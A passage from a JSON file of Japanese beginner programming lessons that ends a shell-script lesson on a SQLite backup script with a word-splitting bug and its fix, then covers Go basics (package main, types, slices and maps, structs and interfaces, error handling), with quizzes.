$DB_PATH\" >&2\n  exit 1\nfi\n```\n\nデータベースのファイルが **無ければ**（`!`）、エラーの出力へメッセージを出して（`>&2`、レッスン 5）、終了コード 1 で終わる（レッスン 3）。\n\n```text\n$ DB_PATH=./none.db ./backup.sh\n[15:21:42] データベースが見つかりません: ./none.db\n（終了コード 1）\n```\n\n### バックアップ（18〜22 行目）\n\n```bash\nmkdir -p \"$BACKUP_DIR\"\ndest=\"$BACKUP_DIR/app-$(date +%Y-%m-%d).db\"\n```\n\n保存先のディレクトリを作り（`-p` はすでにあってもエラーにしない）、`./backups/app-2026-11-23.db` のような名前を作る。\n\n```bash\npython3 -c \"import sqlite3, sys; ...\" \"$DB_PATH\" \"$dest\"\n```\n\n**シェルから Python を 1 行だけ実行** しています。`sqlite3` の `backup()` は、データベースを使っている途中でも安全にコピーできる方法です（ただの `cp` だと、書き込みの途中を写して壊れたコピーになることがある）。シェルの変数は、Python の `sys.argv` として渡しています（レッスン 4 の引数と同じ仕組み）。\nシェルが苦手なこと（データベースの扱い）だけを Python に任せる、という **よい分担** です。\n\n### 古いものを消す（24〜31 行目）\n\n```bash\ncount=0\nfor f in $(ls -1t \"$BACKUP_DIR\"/app-*.db); do\n  count=$((count + 1))\n  if (( count > KEEP )); then\n    log \"古いバックアップを削除: $f\"\n    rm -- \"$f\"\n  fi\ndone\n```\n\n`ls -1t` は「1 行に 1 つ、**新しい順**（`-t`）」。上から数えて、`KEEP`（5）個目より後ろを消します。\n\n## 実際に動かす\n\n`backups/` に 11 月 10 日〜22 日の古いバックアップを 7 つ置いて、実行しました。\n\n```text\n[03:00:00] バックアップしました: ./backups/app-2026-11-23.db (8.0K)\n[03:00:00] 古いバックアップを削除: ./backups/app-2026-11-14.db\n[03:00:00] 古いバックアップを削除: ./backups/app-2026-11-12.db\n[03:00:00] 古いバックアップを削除: ./backups/app-2026-11-10.db\n[03:00:00] 完了（残り 5 個）\n```\n\n```text\n$ ls backups\napp-2026-11-16.db\napp-2026-11-18.db\napp-2026-11-20.db\napp-2026-11-22.db\napp-2026-11-23.db\n```\n\n新しく 1 つ増えて 8 個になり、古い 3 つが消えて、5 個になりました。頼んだとおりに動いています。\n\n## 弱点を探す\n\nちゃんと動きましたが、このコースの知識で見ると、**1 か所、気になるところ** があります。\n\n```bash\nfor f in $(ls -1t \"$BACKUP_DIR\"/app-*.db); do\n```\n\n`$(ls ...)` の結果を、引用符なしで `for` に渡しています。レッスン 4 で見た「`for f in $(ls)` はスペースを含むファイル名で分かれる」形です。\n実際に、スペースを含む `./My Backups` に同じ 7 つのファイルを置いて試しました。\n\n```text\n$ BACKUP_DIR=\"./My Backups\" ./backup.sh\n[...] バックアップしました: ./My Backups/app-2026-11-23.db (8.0K)\n[...] 古いバックアップを削除: Backups/app-2026-11-20.db\nrm: cannot remove 'Backups/app-2026-11-20.db': No such file or directory\n（終了コード 1）\n```\n\nファイル名が `./My` と `Backups/app-...db` に分かれたので、**数え方が狂い**（`./My` と `Backups/...` を別々に 1 個と数えた）、**本当は残すはずの 11 月 20 日の分を消そうとしました**。今回は分かれた名前のファイルが存在しなかったので `rm` が失敗し、`set -e`（レッスン 6）のおかげでそこで止まりましたが、たまたま助かっただけです。\n\n### 直し方\n\n新しい順に並べる必要があるので、グロブ（`for f in *`）をそのまま使うだけでは足りません。ファイル名がこの形（`app-YYYY-MM-DD.db`）に決まっているなら、**名前の順＝日付の順** なので、グロブが使えます。\n\n```bash\nbackups=(\"$BACKUP_DIR\"/app-*.db)           # 配列に入れる（スペースがあっても 1 つずつ）\ntotal=${#backups[@]}                       # 個数\nfor ((i = 0; i < total - KEEP; i++)); do   # 古い方（名前の順で前）から、多い分だけ\n  log \"古いバックアップを削除: ${backups[i]}\"\n  rm -- \"${backups[i]}\"\ndone\n```\n\n| 書き方 | 意味 | Python で言うと |\n|---|---|---|\n| `arr=(a b c)` | 配列 | `arr = [\"a\", \"b\", \"c\"]` |\n| `(\"$DIR\"/app-*.db)` | グロブの結果を、そのまま配列に（分かれない） | `sorted(Path(dir).glob(\"app-*.db\"))` |\n| `${#arr[@]}` | 個数 | `len(arr)` |\n| `${arr[i]}` | i 番目 | `arr[i]` |\n\n同じ `./My Backups2` で直した版を動かすと、11 月 10・12・14 日の 3 つが正しく消えて、残り 5 個になりました。\n\nもう 1 つの考え方は、**ここだけ Python にする** ことです。このスクリプトはすでにバックアップで Python を使っているので、全部を Python で書いても自然です。\n\n```python\nbackups = sorted(Path(backup_dir).glob(\"app-*.db\"))\nfor old in backups[:-keep]:\n    old.unlink()\n```\n\n**シェルは「コマンドを順に実行する」のが得意で、データを扱うのは苦手**。ファイル名を数えて並べ替えるような処理が増えてきたら、Python に任せるのが読みやすく安全です。\n\n## AI のスクリプトを動かす前のチェックリスト\n\n| 確認 | このスクリプトでは |\n|---|---|\n| ① `set -euo pipefail` はあるか | ✅ |\n| ② 何を **消す・上書きする** か | `rm` は `backups/` の中の `app-*.db` だけ。✅ |\n| ③ 変数が空のときに危なくないか | `BACKUP_DIR` は初期値があり、`rm` は `\"$f\"` に `--` 付き。✅ |\n| ④ 変数は引用符で囲まれているか | `$(ls ...)` の 1 か所だけ ⚠️ |\n| ⑤ 入力（環境変数・引数）で動きが変わるところ | `DB_PATH`・`BACKUP_DIR`・`KEEP` |\n| ⑥ まず安全な場所で試したか | 試し用のディレクトリで実行して確認した |\n\n毎日動かすには、cron（Linux・Mac の「決まった時間に実行」の仕組み）や GitHub Actions の `schedule`（公開とクラウドのコースのレッスン 7）に登録します。\n\n```text\n0 3 * * * cd /home/ryo/app && ./backup.sh >> backup.log 2>&1\n（毎日 3 時 0 分に実行し、出力もエラーも backup.log に追記）\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "このスクリプトを `KEEP=10 ./backup.sh` で実行すると？",
        "choices": [
         "新しいバックアップを 10 個まで残す",
         "10 回バックアップを取る",
         "エラーになる（KEEP はスクリプトの中で決めているので）"
        ],
        "answer": 0,
        "explain": "`KEEP=\"${KEEP:-5}\"` は「環境変数 KEEP があればそれを、無ければ 5」です。前に書いた KEEP=10 が使われます。"
       },
       {
        "question": "バックアップに `cp` ではなく Python の `sqlite3` の `backup()` を使っている理由は？",
        "choices": [
         "cp では日本語のファイル名が扱えないから",
         "データベースを使っている途中でも、安全に正しいコピーが取れるから",
         "cp よりファイルが小さくなるから"
        ],
        "answer": 1,
        "explain": "書き込みの途中のファイルをそのままコピーすると、壊れたコピーになることがあります。backup() はそれを避けてコピーします。"
       },
       {
        "question": "`for f in $(ls -1t \"$BACKUP_DIR\"/app-*.db)` の弱点は？",
        "choices": [
         "新しい順に並ばない",
         "BACKUP_DIR にスペースが含まれると、ファイル名が分かれてしまう",
         "ファイルが 5 個未満だとエラーになる"
        ],
        "answer": 1,
        "explain": "`$(ls ...)` の結果を引用符なしで使うと、スペースで分かれます（単語分割）。グロブを配列に入れるか、その部分を Python で書くと安全です。"
       }
      ]
     ],
     "id": "07-reading-a-script"
    }
   ],
   "status": "open"
  },
  {
   "title": "Go",
   "icon": "🐹",
   "order": 70,
   "description": "シンプルで速い、サーバーやコマンドラインのツール向けの言語。package と main、:= と静的型、構造体とインターフェース、if err != nil のエラー処理、goroutine と channel、最後に小さな Web API を読む。すべて Go 1.24 で実行して確かめたもの。",
   "levels": {
    "1": "入門：形と型",
    "2": "基礎：構造体とエラー",
    "3": "実践：並行処理と Web API"
   },
   "id": "70-go",
   "lessons": [
    {
     "title": "package と main ― Go のプログラムの形",
     "level": 1,
     "minutes": 14,
     "concepts": [
      "basics",
      "modules",
      "tooling"
     ],
     "summary": "Go のプログラムの基本の形（package main・import・func main）、go run と go build、1 つのファイルになる実行ファイル。使っていない import や変数がエラーになる厳しさ。",
     "body": "## このレッスンのゴール\n\n- `package main`・`import`・`func main()` の役割を説明できる\n- `go run` と `go build` の違いが分かる\n- 「使っていない変数・import はエラー」という Go の決まりを知っている\n\n## Go とは\n\n**Go**（Golang とも呼ばれる）は、Google が作った言語です。**シンプルで、速く、1 つのファイルの実行ファイルになる** のが特徴で、Web のサーバー（API）や、ターミナルで使うツール（Docker・GitHub CLI の `gh`・Kubernetes なども Go 製）によく使われます。\n\n## 最初のプログラム\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc greet(name string) string {\n\treturn \"こんにちは、\" + name + \" さん\"\n}\n\nfunc main() {\n\tfmt.Println(greet(\"Ryo\"))\n\tfmt.Printf(\"%s は %d 歳です\\n\", \"Hana\", 30)\n\tfmt.Println(strings.ToUpper(\"go\"))\n}\n```\n\n```text\nこんにちは、Ryo さん\nHana は 30 歳です\nGO\n```\n\n（このコースの出力は、すべて Go 1.24 で実際に実行したものです）\n\nPython で書くと、こうなります。\n\n```python\ndef greet(name: str) -> str:\n    return \"こんにちは、\" + name + \" さん\"\n\nprint(greet(\"Ryo\"))\nprint(f\"{'Hana'} は {30} 歳です\")\nprint(\"go\".upper())\n```\n\n| Go | 意味 | Python で言うと |\n|---|---|---|\n| `package main` | このファイルは「main」という **パッケージ**（まとまり）に属する。**実行するプログラムは必ず main** | （ファイル＝モジュール） |\n| `import (\"fmt\" \"strings\")` | 標準ライブラリを読み込む | `import ...` |\n| `func greet(name string) string` | 関数。引数 `name` は string 型、戻り値も string 型 | `def greet(name: str) -> str:` |\n| `func main()` | **プログラムの入口**。ここから実行される | `if __name__ == \"__main__\":` |\n| `{ ... }` | ブロック（インデントではなく波かっこ） | インデント |\n| `fmt.Println(...)` | 表示して改行 | `print(...)` |\n| `fmt.Printf(\"%s %d\\n\", ...)` | 書式を指定して表示（`%s` 文字列、`%d` 整数、`\\n` 改行） | `print(\"%s %d\" % (...))` |\n\n関数や変数の **型を後ろに書く** のが Go の特徴です（`name string`）。TypeScript の `name: string` に似ていますが、`:` はありません。\n\n### 大文字で始まる名前は「外から使える」\n\n`fmt.Println` の `Println`、`strings.ToUpper` の `ToUpper` は **大文字で始まって** います。Go では、\n\n- **大文字で始まる名前** は、他のパッケージから使える（公開）\n- **小文字で始まる名前** は、そのパッケージの中だけ（非公開）\n\nというルールです。Python の「`_` で始まる名前は内部用」という慣習を、**文法として決めた** ものです。\n\n## 実行する\n\n```bash\ngo mod init example.com/hello   # 最初に 1 回。go.mod というファイルができる\ngo run .                        # コンパイルして、すぐ実行\ngo build -o hello .             # 実行ファイル hello を作る\n./hello                         # 作った実行ファイルを実行\n```\n\n| コマンド | 意味 |\n|---|---|\n| `go mod init 名前` | **モジュール**（プロジェクト）を始める。`go.mod` に名前と Go のバージョン、使うライブラリが書かれる（Python の `pyproject.toml`、JavaScript の `package.json`） |\n| `go run .` | このディレクトリのプログラムを、その場でコンパイルして実行 |\n| `go build` | **実行ファイル** を作る |\n| `go get パッケージ` | ライブラリを追加（`pip install` / `npm install`） |\n| `go test ./...` | テストを全部実行 |\n| `gofmt` / `go fmt` | コードの書き方（字下げなど）を自動でそろえる |\n\n`go build` で作った `hello` は、この環境では約 2.2MB の **1 つのファイル** でした。**Go をインストールしていないパソコンにも、このファイルをコピーするだけで動きます**。Python のように「動かす人も Python とライブラリを入れる」必要がないので、配布やデプロイが楽です（公開とクラウドのコースの Docker のイメージも小さくできる）。\n\n## 使っていないものはエラー\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\tx := 1\n\tfmt.Println(\"hi\")\n}\n```\n\n```text\n./l1b.go:5:2: \"os\" imported and not used\n./l1b.go:9:2: declared and not used: x\n```\n\n**使っていない import と、使っていない変数は、コンパイルエラー** になります。Python なら警告すら出ないことです。最初は面倒に感じますが、消し忘れのゴミが残らないので、AI のコードも読みやすくなります。\n\n一時的に使わない値は、`_`（空白の識別子）で受け取ります。\n\n```go\n_ = x                 // 「使わない」と明示\nfor _, v := range items { ... }   // 番号は使わない（レッスン 2）\n```\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `package main` と `func main()` | 実行するプログラム（コマンド） |\n| `package handlers` など main 以外 | 他から使われる部品のパッケージ |\n| `cmd/server/main.go` | Go のプロジェクトでよくある形。`cmd/` の下に実行するプログラムを置く |\n| `go.mod` / `go.sum` | 使うライブラリの一覧と、その中身の確認用の値（ロックファイル。セキュリティのコースのレッスン 6） |\n| `import \"github.com/gin-gonic/gin\"` | ライブラリは **URL のような名前** で読み込む |\n| `func (s *Server) Start()` | メソッド（レッスン 3） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Go のプログラムが実行されるとき、最初に動くのは？",
        "choices": [
         "ファイルの一番上の行",
         "`package main` の中の `func main()`",
         "`import` の中のパッケージ"
        ],
        "answer": 1,
        "explain": "Go は main パッケージの main 関数から実行が始まります。Python の `if __name__ == \"__main__\":` に当たります。"
       },
       {
        "question": "Go で `import \"os\"` と書いたのに、os を一度も使わなかった。どうなる？",
        "choices": [
         "何も起きない",
         "警告が出るが動く",
         "コンパイルエラーで、実行できない"
        ],
        "answer": 2,
        "explain": "Go は使っていない import と変数をエラーにします。不要なら消すか、`_` で受け取ります。"
       },
       {
        "question": "`strings.ToUpper` の `ToUpper` が大文字で始まっている意味は？",
        "choices": [
         "大文字に変換する関数だから",
         "大文字で始まる名前は、他のパッケージから使える（公開）というルールだから",
         "Go では関数名は必ず大文字で始めるから"
        ],
        "answer": 1,
        "explain": "大文字で始まる名前は公開、小文字は同じパッケージの中だけです。自分のパッケージの中で使う関数は小文字でも書けます。"
       }
      ]
     ],
     "id": "01-package-main"
    },
    {
     "title": "静的型と := ・スライスとマップ",
     "level": 1,
     "minutes": 18,
     "concepts": [
      "variables",
      "types",
      "collections",
      "loops"
     ],
     "summary": "var と := での変数の作り方、ゼロ値、int と float64 を混ぜるとエラーになる静的型、複数の戻り値。Python のリストと辞書にあたるスライスとマップ、for range、「無いキーは 0 になる」ので ok で確かめる書き方。",
     "body": "## このレッスンのゴール\n\n- `var x int = 3` と `x := 3` を読み分けられる\n- 静的型・ゼロ値・型変換の意味が分かる\n- スライス・マップ・`for range`・`v, ok := m[key]` を読める\n\n## 変数の作り方\n\n```go\nvar count int = 3      // 型を書いて作る\nname := \"Ryo\"          // := は「作って入れる」。型は値から決まる（string）\nprice := 1980          // int\nrate := 0.1            // float64（小数）\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `var 名前 型 = 値` | 型を書いて作る |\n| `名前 := 値` | **作って入れる**。型は自動で決まる（関数の中だけで使える） |\n| `名前 = 値` | すでにある変数に入れ直す（`:` が無い） |\n| `const tax = 0.1` | 定数（変えられない） |\n\n`:=` と `=` の違いがポイントです。`:=` は **新しく作る**、`=` は **入れ直す**。Python には区別がありませんが、Go では間違えるとエラーになります。\n\n### ゼロ値：入れなくても空ではない\n\n```go\nvar zeroInt int\nvar zeroStr string\nvar zeroBool bool\nfmt.Printf(\"[%d] [%q] [%t]\\n\", zeroInt, zeroStr, zeroBool)\n// [0] [\"\"] [false]\n```\n\n値を入れずに作った変数は、**型ごとの「ゼロ値」** になります（数は 0、文字列は空文字、真偽は false、ポインタやマップは `nil`）。Python の `None` のような「何も入っていない」状態は、普通の変数にはありません。\n\n## 静的型：型は変わらない\n\n```go\nprice := 1980\nrate := 0.1\n_ = price * rate\n// invalid operation: price * rate (mismatched types int and float64)\n\nvar s string = 3\n// cannot use 3 (untyped int constant) as string value in variable declaration\n```\n\nGo は **静的型** の言語で、変数の型は作ったときに決まり、変わりません。**int（整数）と float64（小数）を、そのまま混ぜて計算することもできません**。Python なら `1980 * 0.1` は普通に動きますが、Go は型を明示的に変換します。\n\n```go\ntotal := float64(price) * (1 + rate)   // int を float64 に変換してから\n```\n\n| 型 | 中身 | Python で言うと |\n|---|---|---|\n| `int` | 整数 | `int`（ただし大きさに上限がある） |\n| `float64` | 小数 | `float` |\n| `string` | 文字列 | `str` |\n| `bool` | `true` / `false`（小文字） | `True` / `False` |\n| `[]string` | 文字列のスライス | `list[str]` |\n| `map[string]int` | 文字列 → 整数のマップ | `dict[str, int]` |\n\n`fmt.Printf(\"%T\", x)` で型を表示でき、上の変数は `int float64 []string map[string]int` と出ました。\n\n## 複数の値を返す\n\n```go\nfunc divide(a, b int) (int, int) {\n\treturn a / b, a % b\n}\n\nq, r := divide(7, 2)\nfmt.Println(q, r)   // 3 1\n```\n\nGo の関数は **複数の値を返せます**。Python のタプルを返すのと似ています。そして、`7 / 2` が **3**（整数どうしの割り算は切り捨て。SQL コースのレッスン 8 と同じ）なのにも注意です。\nこの「複数の戻り値」は、レッスン 4 の **エラー処理** で必ず使います。\n\n## スライス：伸び縮みする配列\n\n```go\nfruits := []string{\"りんご\", \"バナナ\"}\nfruits = append(fruits, \"みかん\")\nfmt.Println(fruits, len(fruits), fruits[0], fruits[1:])\n// [りんご バナナ みかん] 3 りんご [バナナ みかん]\n```\n\n| Go | Python |\n|---|---|\n| `[]string{\"a\", \"b\"}` | `[\"a\", \"b\"]` |\n| `fruits = append(fruits, \"c\")` | `fruits.append(\"c\")` |\n| `len(fruits)` | `len(fruits)` |\n| `fruits[1:]` | `fruits[1:]` |\n\n⚠️ `append` は **新しいスライスを返す** ので、`fruits = append(fruits, ...)` と **受け取り直す** のが決まりです。`append(fruits, \"c\")` だけ書くと、エラー（結果を使っていない）になります。\n\n`[3]string` のように数を書くと、大きさが決まった **配列** になります。普段使うのはスライスです。\n\n## マップ：辞書\n\n```go\nprices := map[string]int{\"りんご\": 120, \"バナナ\": 90}\nprices[\"みかん\"] = 80\n\np, ok := prices[\"ぶどう\"]\nfmt.Println(prices[\"りんご\"], p, ok)\n// 120 0 false\n```\n\n**無いキーを読むと、エラーにならずにゼロ値（0）が返ります**。Python の `prices[\"ぶどう\"]` は `KeyError` でしたね。\n「0 円の商品」なのか「無い商品」なのかを区別するには、**2 つ目の値 `ok`**（あれば true）で確かめます。\n\n```go\nif p, ok := prices[name]; ok {\n\tfmt.Println(name, \"は\", p, \"円\")\n} else {\n\tfmt.Println(name, \"はありません\")\n}\n```\n\nPython の `if name in prices:` や `prices.get(name)` に当たります。\n\n## for range：繰り返し\n\n```go\nfor i, f := range fruits {\n\tfmt.Println(i, f)          // 0 りんご / 1 バナナ / 2 みかん\n}\n\nfor k, v := range prices {     // マップのキーと値\n\tfmt.Println(k, v)\n}\n\nfor _, f := range fruits { }   // 番号を使わないなら _\nfor i := 0; i < 3; i++ { }     // 数で繰り返す\n```\n\n| Go | Python |\n|---|---|\n| `for i, f := range fruits` | `for i, f in enumerate(fruits):` |\n| `for k, v := range m` | `for k, v in m.items():` |\n| `for i := 0; i < 3; i++` | `for i in range(3):` |\n| `for 条件 { }` | `while 条件:`（Go に while は無い） |\n\n⚠️ マップを `range` で回す順番は **毎回変わります**（わざとランダムにしてある）。順番が大事なら、キーを取り出して並べ替えます。\n\n## if：条件の前に 1 文書ける\n\n```go\nif n := len(fruits); n > 2 {\n\tfmt.Println(\"3 つ以上\", n)\n}\n```\n\n`if 準備の文; 条件 {` と書けて、`n` は if の中だけで使えます。Go のコードでとてもよく見る形です。条件にかっこは付けません。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `x := ...` と `x = ...` | 作る／入れ直す。`:=` を 2 回書くと「新しい変数が無い」エラー |\n| `float64(n)` / `int(f)` / `strconv.Itoa(n)` | 型の変換。`int(2.9)` は 2（切り捨て） |\n| `v := m[key]` だけで使っている | ⚠️ 無いキーでもゼロ値が返る。`v, ok := m[key]` で確かめているか |\n| `items = append(items, x)` | スライスに追加（受け取り直す） |\n| `make([]int, 0, 10)` / `make(map[string]int)` | 空のスライス・マップを作る（10 は最初に用意する大きさ） |\n| `var m map[string]int` のあと `m[\"a\"] = 1` | ⚠️ nil のマップに書くと panic（停止）。`make` で作る |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Go で `x := 1` の後、同じ関数の中で `x := 2` と書くと？",
        "choices": [
         "x が 2 になる",
         "エラーになる（:= は新しく作る書き方で、x はもうあるから）",
         "別の変数 x ができる"
        ],
        "answer": 1,
        "explain": "入れ直すときは `x = 2` と書きます。`:=` は「作って入れる」です。"
       },
       {
        "question": "`prices := map[string]int{\"りんご\": 120}` のとき、`prices[\"ぶどう\"]` の値は？",
        "choices": [
         "エラー（KeyError のようなもの）",
         "0（int のゼロ値）",
         "nil"
        ],
        "answer": 1,
        "explain": "無いキーはゼロ値になります。あるかどうかは `p, ok := prices[\"ぶどう\"]` の ok で確かめます。"
       },
       {
        "question": "`price := 1980; rate := 0.1; total := price * rate` がエラーになる理由は？",
        "choices": [
         "int と float64 を、変換せずに混ぜて計算しているから",
         "1980 が大きすぎるから",
         ":= で計算はできないから"
        ],
        "answer": 0,
        "explain": "Go は型を自動で変換しません。`float64(price) * rate` のように変換してから計算します。"
       }
      ]
     ],
     "id": "02-types-slices-maps"
    },
    {
     "title": "構造体・メソッド・インターフェース",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "classes",
      "types",
      "generics"
     ],
     "summary": "Go にはクラスが無く、データは構造体（struct）、処理はメソッドで書く。値で受け取るメソッドとポインタ（*）で受け取るメソッドの違いを実験で確かめ、「同じメソッドを持てばよい」インターフェースを読む。",
     "body": "## このレッスンのゴール\n\n- `type Product struct { ... }` と、そのメソッドを読める\n- `func (p Product)` と `func (p *Product)` の違い（コピーか本体か）を説明できる\n- インターフェースが「必要なメソッドの一覧」であることが分かる\n\n## 構造体：データのまとまり\n\n```go\ntype Product struct {\n\tName  string\n\tPrice int\n\tstock int        // 小文字 → このパッケージの中だけ（レッスン 1）\n}\n\napple := Product{Name: \"りんご\", Price: 120}\nfmt.Println(apple.Name)     // りんご\n```\n\nPython の `@dataclass`（Python コースのレッスン 12）にそっくりです。\n\n```python\n@dataclass\nclass Product:\n    name: str\n    price: int\n    _stock: int = 0\n```\n\n書かなかった項目（`stock`）は、ゼロ値（0）になります。\n\n## メソッド：構造体に処理を付ける\n\n```go\nfunc (p Product) WithTax() int {\n\treturn p.Price * 110 / 100\n}\n\nfmt.Println(apple.WithTax())   // 132\n```\n\n`func (p Product) WithTax()` の **`(p Product)` の部分** が「この関数は Product のメソッドで、本体を `p` という名前で使う」という意味です（**レシーバー** と呼びます）。Python の `def with_tax(self):` の `self` を、関数名の前に書いている形です。\n\nGo には `class` がありません。**構造体（データ）と、メソッド（処理）を別々に書く** のが Go の流儀です。継承もありません。\n\n## 値で受け取るか、ポインタで受け取るか\n\nここが Go のメソッドでいちばん大事なところです。値段を下げるメソッドを、2 通り書いて試しました。\n\n```go\nfunc (p *Product) Discount(yen int) {       // * が付いている\n\tp.Price -= yen\n}\n\nfunc (p Product) DiscountCopy(yen int) {    // * が無い\n\tp.Price -= yen\n}\n\napple.DiscountCopy(20)\nfmt.Println(\"コピーに値引き:\", apple.Price)     // 120   ← 変わっていない！\napple.Discount(20)\nfmt.Println(\"ポインタで値引き:\", apple.Price)   // 100   ← 変わった\n```\n\n| 書き方 | p に入るもの | 中を変えると |\n|---|---|---|\n| `func (p Product)` | **コピー** | コピーが変わるだけ。元の apple は変わらない |\n| `func (p *Product)` | **ポインタ**（元の apple の場所） | 元の apple が変わる |\n\n`*Product` の `*` は **ポインタ**（データが置いてある場所を指すもの）を表します。C 言語コースでくわしく扱いますが、ここでは **「`*` 付きなら本体を直接さわる」** と覚えれば十分です。\n\nPython では、メソッドの中で `self.price -= 20` とすれば必ず本体が変わりました。Go では **`*` を付け忘れると、変えたつもりが変わっていない** というバグになります。\n\n| 迷ったら | |\n|---|---|\n| 中身を **変える** メソッド | `*` 付き |\n| 構造体が大きい | `*` 付き（コピーが重いので） |\n| 読むだけで小さい | どちらでもよい（そろえるのが一般的） |\n\n## 表示を決める：String メソッド\n\n```go\nfunc (p Product) String() string {\n\treturn fmt.Sprintf(\"%s（%d 円）\", p.Name, p.Price)\n}\n\nfmt.Println(apple)   // りんご（100 円）\n```\n\n`String() string` というメソッドを持たせると、`fmt.Println` での表示がそれになります。Python の `__str__` です。これは次のインターフェースの仕組みで動いています。\n\n## インターフェース：「このメソッドを持っていればよい」\n\n```go\ntype Shape interface {\n\tArea() float64\n}\n\ntype Rect struct{ W, H float64 }\ntype Circle struct{ R float64 }\n\nfunc (r Rect) Area() float64   { return r.W * r.H }\nfunc (c Circle) Area() float64 { return 3.14 * c.R * c.R }\n\nshapes := []Shape{Rect{W: 2, H: 3}, Circle{R: 1}}\nfor _, s := range shapes {\n\tfmt.Printf(\"%T %.2f\\n\", s, s.Area())\n}\n// main.Rect 6.00\n// main.Circle 3.14\n```\n\n| 部分 | 意味 |\n|---|---|\n| `type Shape interface { Area() float64 }` | 「`Area() float64` というメソッドを持つものは、何でも Shape として扱える」 |\n| `[]Shape{Rect{...}, Circle{...}}` | 違う型を、同じ Shape として 1 つのスライスに入れられる |\n| `s.Area()` | 中身が Rect なら Rect の、Circle なら Circle の Area が呼ばれる |\n\n⚠️ Rect にも Circle にも **「Shape を実装します」とはどこにも書いていません**。必要なメソッドを持っていれば、**自動で** そのインターフェースとして使えます。\n\nPython で言うと、「`area()` を持っていれば何でもよい」という **ダックタイピング** を、型のチェック付きにしたものです（Python の `typing.Protocol` がほぼ同じ考え方）。TypeScript の interface（TypeScript コースのレッスン 3）にも近いです。\n\n### よく出てくる標準のインターフェース\n\n| インターフェース | 持つべきメソッド | 意味 |\n|---|---|---|\n| `fmt.Stringer` | `String() string` | 表示の仕方（上の例） |\n| `error` | `Error() string` | エラー（次のレッスン） |\n| `io.Reader` / `io.Writer` | `Read(...)` / `Write(...)` | 読める・書けるもの（ファイル・ネットワーク・文字列…） |\n| `http.Handler` | `ServeHTTP(...)` | Web のリクエストを処理するもの（レッスン 6） |\n\n## nil\n\n```go\nvar nothing *Product\nfmt.Println(nothing == nil)   // true\n```\n\nポインタ・スライス・マップ・インターフェースは、何も指していないとき **`nil`**（Python の `None`）になります。⚠️ nil のポインタのフィールドを読む（`nothing.Name`）と、**panic**（プログラムが止まる）します。Go のプログラムでいちばんよく見る停止の原因の 1 つです。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `func (s *Service) Create(...)` | Service のメソッド。中を変えるので `*` |\n| 中身を変えるメソッドなのに `func (s Service)` | ⚠️ コピーを変えているだけで、元が変わらない |\n| `type Repository interface { Find(id int) (*User, error) }` | 「Find を持っていれば何でもよい」。テストで偽物（モック）に差し替えるためによく使う |\n| `return &Product{...}` | 作った構造体のポインタを返す（`&` は「場所を取る」） |\n| `` `json:\"name\"` `` | 構造体のタグ。JSON にするときの名前（レッスン 6） |\n| `if p == nil { return ... }` | nil チェック。panic を防ぐ |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`func (p Product) SetPrice(n int) { p.Price = n }` を呼んでも、元の値段が変わらない理由は？",
        "choices": [
         "Price が小文字ではないから",
         "レシーバーが `*` 無しなので、p はコピーで、元の Product は変わらないから",
         "メソッドは値を変えられないから"
        ],
        "answer": 1,
        "explain": "中身を変えるメソッドは `func (p *Product)` とポインタで受け取ります。"
       },
       {
        "question": "Go の Rect 型を `Shape` インターフェースとして使えるようにするには？",
        "choices": [
         "`type Rect struct implements Shape` と書く",
         "Shape を継承する",
         "Shape が必要とするメソッド（`Area() float64`）を Rect に定義する"
        ],
        "answer": 2,
        "explain": "Go のインターフェースは、必要なメソッドを持っていれば自動で当てはまります。「実装します」という宣言はいりません。"
       },
       {
        "question": "`fmt.Println(apple)` で「りんご（100 円）」と表示されたのは、なぜ？",
        "choices": [
         "fmt.Println がすべての構造体を日本語で表示するから",
         "Product に `String() string` メソッドがあり、fmt.Stringer インターフェースとして表示に使われたから",
         "Name と Price が大文字だから"
        ],
        "answer": 1,
        "explain": "String メソッドを持つ型は、表示のときにそれが使われます。Python の `__str__` に当たります。"
       }
      ]
     ],
     "id": "03-structs-interfaces"
    },
    {
     "title": "エラーを値で返す ― if err != nil",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "errors",
      "functions"
     ],
     "summary": "Go には try/except が無く、エラーは戻り値の最後で返して if err != nil で確かめる。fmt.Errorf の %w で包む、errors.Is で種類を見分ける、defer で後片付け、panic との違い。err を _ で捨てる危険。",
     "body": "## このレッスンのゴール\n\n- `値, err := 関数()` と `if err != nil { ... }` の流れを読める\n- `fmt.Errorf(\"...: %w\", err)` と `errors.Is` の意味が分かる\n- `defer` の動きと、`panic` との違いを説明できる\n\n## Go には例外が無い\n\nPython では、失敗すると **例外** が飛んで、`try / except` で受け止めました。Go には例外の仕組みがありません。代わりに、**失敗したかどうかを、戻り値で返します**。\n\n```go\nn, err := strconv.Atoi(\"12a\")      // 文字列を数に変換\nfmt.Println(n, err)\n// 0 strconv.Atoi: parsing \"12a\": invalid syntax\n```\n\n| 戻り値 | 成功したとき | 失敗したとき |\n|---|---|---|\n| 1 つ目（n） | 変換した数 | ゼロ値（0） |\n| 2 つ目（err） | **`nil`**（エラー無し） | エラーの内容 |\n\n**最後の戻り値が `error` 型** なのが Go の決まりです。そして、呼んだ側は必ずこう確かめます。\n\n```go\nn, err := strconv.Atoi(s)\nif err != nil {\n\treturn 0, err        // 失敗したら、呼んだ人にそのまま返す\n}\n// ここから下は、成功したときだけ\n```\n\nPython で書くと、こうです。\n\n```python\ntry:\n    n = int(s)\nexcept ValueError as e:\n    raise e\n```\n\nGo のコードに `if err != nil` が何十回も出てくるのはこのためです。最初はくどく見えますが、**どこで失敗しうるかが、コードを見れば全部分かる** という良さがあります。\n\n## 自分でエラーを返す\n\n```go\nvar ErrNotFound = errors.New(\"商品が見つかりません\")\n\nfunc findPrice(name string) (int, error) 